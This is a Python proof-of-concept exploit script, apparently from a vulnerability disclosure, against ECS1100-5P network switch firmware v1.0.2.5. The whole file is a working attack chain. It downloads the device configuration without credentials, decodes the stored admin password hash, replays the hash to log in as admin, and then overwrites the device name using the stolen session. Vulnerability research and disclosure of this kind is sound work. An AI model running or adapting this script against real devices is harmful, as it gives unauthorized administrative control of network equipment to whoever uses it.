#!/usr/bin/env python3
"""
PoC: Finding #14 + #5 — Unauthenticated config disclosure → authenticated device takeover
ECS1100-5P firmware v1.0.2.5

Headless variant — no browser required. Uses only the Python standard library.

Attack chain:
  1. Fetch /romfile.cfg with no credentials (Unauthenticated config disclosure)
  2. Decode the stored password hash from the config
  3. Replay the hash to /logon.cgi to obtain a valid session cookie
  4. Use the session to call /systemrelated.cgi and overwrite the Device Name

Requirements: Python 3.6+, network access to port 80 on the target.
"""

import base64
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TARGET   = "10.0.0.2"
BASE_URL = f"http://{TARGET}"
NEW_NAME = "Pwned-by-h"


def fetch_config():
    print(f"[*] Step 1 — Fetching {BASE_URL}/romfile.cfg (no credentials required)...")
    try:
        resp = urllib.request.urlopen(f"{BASE_URL}/romfile.cfg", timeout=10)
        data = resp.read().decode("utf-8", errors="replace")
        resp.close()
        print(f"[+] Got {len(data)} bytes")
        return data
    except urllib.error.URLError as e:
        print(f"[-] Failed to fetch config: {e}")
        sys.exit(1)


def decode_config(cfg):
    results = {}

    m = re.search(r"ip&dhcp\$(\d)\?ip\$0x\s*([0-9a-f]+)\?mask\$0x([0-9a-f]+)\?gw\$0x\s*([0-9a-f]+)", cfg)
    if m:
        def hex_to_ip(h):
            v = int(h.replace(" ", ""), 16)
            return ".".join(str((v >> (8 * i)) & 0xFF) for i in range(3, -1, -1))
        results["ip_mode"] = "DHCP" if m.group(1) == "1" else "Static"
        results["ip"]      = hex_to_ip(m.group(2))
        results["mask"]    = hex_to_ip(m.group(3))
        results["gateway"] = hex_to_ip(m.group(4))

    m = re.search(r"dns&ip\$0x\s*([0-9a-f]+)", cfg)
    if m:
        v = int(m.group(1).replace(" ", ""), 16)
        results["dns"] = ".".join(str((v >> (8 * i)) & 0xFF) for i in range(3, -1, -1))

    m = re.search(r"user&([A-Za-z0-9+/=]+)\?", cfg)
    if m:
        results["pw_hash_b64"] = m.group(1)
        results["pw_hash"]     = base64.b64decode(m.group(1)).decode()

    vlans = []
    for m in re.finditer(r"vla&v\$\s*(\d+)\?n\$([A-Za-z0-9+/=]+)\?u\$([^?]+)", cfg):
        name = base64.b64decode(m.group(2)).decode(errors="replace")
        vlans.append({"id": m.group(1).strip(), "name": name, "ports": m.group(3)})
    results["vlans"] = vlans

    m = re.search(r"ecl&en\$(\d)\?dn\$([^?#]+)\?", cfg)
    if m:
        results["cloud_enabled"]  = m.group(1) == "1"
        results["cloud_endpoint"] = m.group(2).strip()

    m = re.search(r"sntp&mode\$\s*\d\?ser\$([^?]+)\?utc\$([^?]+)\?nm\$([^?]+)\?", cfg)
    if m:
        results["ntp_server"] = m.group(1)
        results["timezone"]   = f"{m.group(3).strip()} ({m.group(2)})"

    m = re.search(r"csr&dn\$([^?]+)\?", cfg)
    if m:
        results["device_name"] = m.group(1).strip()

    return results


def print_config(info):
    print()
    print("=" * 55)
    print("  DECODED CONFIG (romfile.cfg)")
    print("=" * 55)
    print(f"  Device name : {info.get('device_name', 'n/a')}")
    print()
    print("  [Network]")
    print(f"    Mode    : {info.get('ip_mode', 'n/a')}")
    print(f"    IP      : {info.get('ip', 'n/a')}")
    print(f"    Mask    : {info.get('mask', 'n/a')}")
    print(f"    Gateway : {info.get('gateway', 'n/a')}")
    print(f"    DNS     : {info.get('dns', 'n/a')}")
    print()
    print("  [Credentials]")
    print(f"    Password hash (b64) : {info.get('pw_hash_b64', 'n/a')}")
    print(f"    Password hash       : {info.get('pw_hash', 'n/a')}")
    print(f"    Hash type           : MD5 truncated (md5(pass, 16))")
    print()
    for vlan in info.get("vlans", []):
        print(f"  [VLAN {vlan['id']}]  name={vlan['name']}  ports={vlan['ports']}")
    if info.get("vlans"):
        print()
    print("  [Cloud]")
    print(f"    Endpoint : {info.get('cloud_endpoint', 'n/a')}")
    print(f"    Enabled  : {info.get('cloud_enabled', 'n/a')}")
    print()
    print("  [Time]")
    print(f"    NTP      : {info.get('ntp_server', 'n/a')}")
    print(f"    Timezone : {info.get('timezone', 'n/a')}")
    print("=" * 55)
    print()


def authenticate(pw_hash):
    print(f"[*] Step 2 — Replaying extracted hash to authenticate as admin...")
    print(f"    POST {BASE_URL}/logon.cgi  password={pw_hash}")

    boundary = "----poc14boundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\nadmin\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{pw_hash}\r\n'
        f"--{boundary}--\r\n"
    ).encode()

    req = urllib.request.Request(
        f"{BASE_URL}/logon.cgi",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        raw  = resp.read().decode()
        resp.close()
    except urllib.error.URLError as e:
        print(f"[-] Login request failed: {e}")
        sys.exit(1)

    if raw.startswith("<!--#webCookie-->"):
        session = raw[17:]
        print(f"[+] Authenticated!  session cookie = {session}")
        return session
    elif raw == "ERROR1":
        print("[-] Login rejected (ERROR1 — wrong password)")
        sys.exit(1)
    else:
        print(f"[-] Unexpected response: {raw!r}")
        sys.exit(1)


def get_system_info(session):
    """Read current device name, location, and contact from systemrelated.cgi."""
    ts  = time.time_ns() // 1_000_000
    req = urllib.request.Request(f"{BASE_URL}/systemrelated.cgi?v={ts}")
    req.add_header("Cookie", f"auth_cookie={session}")
    req.add_header("Referer", BASE_URL + "/")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        resp.close()
    except urllib.error.URLError as e:
        print(f"[-] Could not read system info: {e}")
        return "", "", ""

    m = re.search(
        r"cld_device_name\s*='([^']*)'.*?cld_location\s*='([^']*)'.*?cld_contact_name\s*='([^']*)'",
        body, re.DOTALL,
    )
    if m:
        return m.group(1), m.group(2), m.group(3)
    return "", "", ""


def set_device_name(session, new_name):
    print(f"[*] Step 3 — Reading current system settings...")
    device_name, location, contact = get_system_info(session)
    print(f"    Current device name : {device_name!r}")
    print(f"    Location            : {location!r}")
    print(f"    Contact             : {contact!r}")

    ts     = time.time_ns() // 1_000_000
    params = urllib.parse.urlencode({"dn": new_name, "lo": location, "ct": contact, "timestamp": ts})
    url    = f"{BASE_URL}/systemrelated.cgi?{params}"

    print(f"\n[*] Step 4 — Writing new device name: {new_name!r}")
    print(f"    GET {url}")

    req = urllib.request.Request(url)
    req.add_header("Cookie",  f"auth_cookie={session}")
    req.add_header("Referer", BASE_URL + "/System_Account.html")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        resp.read()
        resp.close()
    except urllib.error.URLError as e:
        print(f"[-] Write request failed: {e}")
        sys.exit(1)

    print(f"[+] Write request accepted")

    print(f"\n[*] Step 5 — Verifying change...")
    confirmed_name, _, _ = get_system_info(session)
    if confirmed_name == new_name:
        print(f"[+] CONFIRMED — Device name is now: {confirmed_name!r}")
    else:
        print(f"[-] Unexpected value after write: {confirmed_name!r}")


def main():
    print("=" * 65)
    print("  ECS1100-5P v1.0.2.5 — Unauthenticated Admin Takeover PoC")
    print(f"  Target : {BASE_URL}")
    print(f"  Action : Set Device Name → {NEW_NAME!r}")
    print("=" * 65)

    cfg_raw  = fetch_config()
    info     = decode_config(cfg_raw)
    print_config(info)

    pw_hash = info.get("pw_hash")
    if not pw_hash:
        print("[-] No password hash found in config — cannot proceed")
        sys.exit(1)

    session = authenticate(pw_hash)
    set_device_name(session, NEW_NAME)

    print()
    print("=" * 65)
    print("[+] Done.")
    print("=" * 65)


if __name__ == "__main__":
    main()
